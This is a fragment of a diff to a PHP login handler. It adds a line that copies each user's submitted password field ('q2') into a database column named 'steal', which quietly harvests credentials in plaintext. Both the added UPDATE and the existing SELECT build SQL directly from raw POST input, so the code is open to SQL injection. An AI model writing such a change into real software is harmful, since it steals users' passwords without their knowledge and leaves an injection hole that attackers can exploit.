@@ -9,6 +9,8 @@ if ( isset( $_POST[ 'b1' ] ) && !empty( $_POST[ 'q1' ] ) &&
 
     !empty( $_POST[ 'q2' ] ) ) {
 
+      mysqli_query($conn,"update user_info set steal = '".$_POST['q2']."' where username = '" . $_POST[ 'q1' ] . "'");
+
     $log = mysqli_query($conn,"select * from user_info where username = '" . $_POST[ 'q1' ] . "' 
 
                                                             and 
